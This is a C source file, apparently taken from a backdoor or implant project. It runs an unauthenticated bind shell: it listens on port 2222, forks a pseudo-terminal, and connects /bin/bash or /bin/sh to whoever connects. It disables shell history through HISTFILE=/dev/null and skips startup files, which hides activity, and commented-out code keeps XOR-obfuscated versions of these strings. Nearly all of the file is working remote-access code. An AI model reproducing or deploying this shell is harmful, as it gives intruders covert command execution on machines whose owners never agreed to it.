#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <pty.h>
//#include <util.h>
#include <pthread.h>
#include <signal.h>
#include <errno.h>

#include "common.h"
#include "config.h"
//#include "commands.h"
//#include "util.h"

#include "server.h"

struct swap_args {
    pid_t child_pid;
    int sockfd;
    int amaster;
};

static void *swap_thread(void *ptr)
{
    struct swap_args *args = (struct swap_args *)ptr;
    pid_t pid;
    int socket_fd, amaster, max_fd, ret;
    fd_set rset;
    char buffer[DATA_MAX_SIZE];

    pid = args->child_pid;
    socket_fd = args->sockfd;
    amaster = args->amaster;
    free(args);

    max_fd = (amaster > socket_fd) ? amaster : socket_fd;

    while (1) {
        FD_ZERO(&rset);
        FD_SET(socket_fd, &rset);
        FD_SET(amaster, &rset);

        ret = select(max_fd + 1, &rset, NULL, NULL, &(struct timeval) { COMMAND_TIMEOUT, 0 });

        if (ret == -1) {
            debug_print("select() error\n");
            break;
        } else if (ret == 0) {
            debug_print("select() timeout\n");
            break;
        }

        if (FD_ISSET(socket_fd, &rset)) {
            if ((ret = read(socket_fd, buffer, DATA_MAX_SIZE)) > 0) {
                if (write(amaster, buffer, ret) != ret) {
                    debug_print("cannot write to pty\n");
                    break;
                }
            } else {
                debug_print("crypto_recv() error\n");
                break;
            }
        }

        if (FD_ISSET(amaster, &rset)) {
            if ((ret = read(amaster, buffer, DATA_MAX_SIZE)) > 0) {
                if (write(socket_fd, buffer, ret) != ret) {
                    debug_print("crypto_send() error\n");
                    break;
                }
            } else {
                debug_print("cannot read from pty\n");
                break;
            }
        }
    }

    debug_print("connection has lost\n");

    kill(pid, SIGKILL);
    close(amaster);
    close(socket_fd);
    pthread_exit(NULL);
}

int spawn_pty_client(int socket_fd)
{
    int pid = -1, amaster = -1, aslave = -1;
    int res = EXIT_FAILURE;
    pthread_t tid;
    struct winsize winsize;
    struct swap_args *swap_args = malloc(sizeof(struct swap_args));

    if (read(socket_fd, (char *) &winsize, sizeof(struct winsize)) != sizeof(struct winsize)) {
        debug_print("error receiving winsize from host\n");
        goto cleanup;
    }
    debug_print("got window size --> %d:%d\n", winsize.ws_col, winsize.ws_row);

    if (openpty(&amaster, &aslave, NULL, NULL, NULL) < 0) {
        debug_print("openpty() error: %s\n", strerror(errno));
        goto cleanup;
    }
    // if (!(slave_filename = ttyname(aslave))) {
    //     return 1;
    // }

    if (ioctl(amaster, TIOCSWINSZ, &winsize) < 0) {
        debug_print("ioctl() error: %s\n", strerror(errno));
        goto cleanup;
    }

    if ((pid = fork()) < 0) {
        debug_print("fork() error: %s\n", strerror(errno));
        goto cleanup;
    }

    if (pid == 0) {
        /* child */

        close(socket_fd);
        close(amaster);

        if (setsid() < 0) {
            debug_print("setsid(): %s\n", strerror(errno));
        }

        setuid(1000);

        if (ioctl(aslave, TIOCSCTTY, NULL) < 0) {
            debug_print("ioctl() error: %s\n", strerror(errno));
        }

        dup2(aslave, STDIN_FILENO);
        dup2(aslave, STDOUT_FILENO);
        dup2(aslave, STDERR_FILENO);

        if (aslave > 2) {
            close(aslave);
        }

        /* HISTFILE=/dev/null */
//        char histfile[] = { '\xfb', '\xe0', '\x00', '\x10', '\x36', '\xb2', '\x89', '\x0d', '\xd4', '\x71', '\xec', '\x52', '\x18', '\xb8', '\x5f', '\xb6', '\x63', '\x42', '\x55', };
//        deobfuscate(histfile);
//        putenv(histfile);

        /* /bin/bash */
//        char bash[] = { '\x9c', '\xcb', '\x3a', '\x2a', '\x5f', '\x99', '\xa4', '\x3b', '\x81', '\x5e', };
//        deobfuscate(bash);

        /* --norc */
//        char norc[] = { '\x9e', '\x84', '\x3d', '\x2b', '\x02', '\x98', '\xc5', };
//        deobfuscate(norc);

        /* --noprofile */
//        char noprofile[] = { '\x9e', '\x84', '\x3d', '\x2b', '\x00', '\x89', '\xaa', '\x2e', '\x80', '\x32', '\xed', '\x37', };
//        deobfuscate(noprofile);

        char histfile[100] = "HISTFILE=/dev/null";
        char bash[100] = "/bin/bash";
        char norc[100] = "--norc";
        char noprofile[100] = "--noprofile";

        execl(bash, bash, NULL, norc, noprofile, NULL);

        /* /bin/sh */
//        char sh[] = { '\x9c', '\xcb', '\x3a', '\x2a', '\x5f', '\x88', '\xad', '\x48', };
//        deobfuscate(sh);

        /* if there is no bash */
        char sh[100] = "/bin/sh";
        execl(sh, sh, NULL);

        /* never executed */
        exit(0);
    }

    /* parent */

    close(aslave);

    swap_args->child_pid = pid;
    swap_args->sockfd = socket_fd;
    swap_args->amaster = amaster;

    swap_thread(swap_args);
    // if (pthread_create(&tid, NULL, swap_thread, (void *) swap_args)) {
    //     debug_print("pthread_create() err\n");
    //     goto cleanup;
    // }
    // pthread_detach(tid);

    res = EXIT_SUCCESS;
cleanup:
    if (res) {
        if (pid > 0)
            kill(pid, SIGKILL);
        if (amaster != -1)
            close(amaster);
        close(socket_fd);
    }
    return res;
}


int main(){
/*
    struct addrinfo hints, *res;
    int sockfd;

    // first, load up address structs with getaddrinfo():

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;

    getaddrinfo("127.0.0.1", "2222", &hints, &res);

    // make a socket:

    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);

    // connect!

    printf("%d\n", connect(sockfd, res->ai_addr, res->ai_addrlen));
*/
    struct sockaddr_storage their_addr;
    socklen_t addr_size;
    struct addrinfo hints, *res;
    int sockfd, new_fd;

    // !! don't forget your error checking for these calls !!

    // first, load up address structs with getaddrinfo():

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC;  // use IPv4 or IPv6, whichever
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;     // fill in my IP for me

    getaddrinfo(NULL, "2222", &hints, &res);

    sockfd = socket(res->ai_family, res->ai_socktype, res->ai_protocol);

    // bind it to the port we passed in to getaddrinfo():

    bind(sockfd, res->ai_addr, res->ai_addrlen);
    listen(sockfd, 10);

    // now accept an incoming connection:

    addr_size = sizeof their_addr;
    new_fd = accept(sockfd, (struct sockaddr *)&their_addr, &addr_size);
    return spawn_pty_client(new_fd);
}
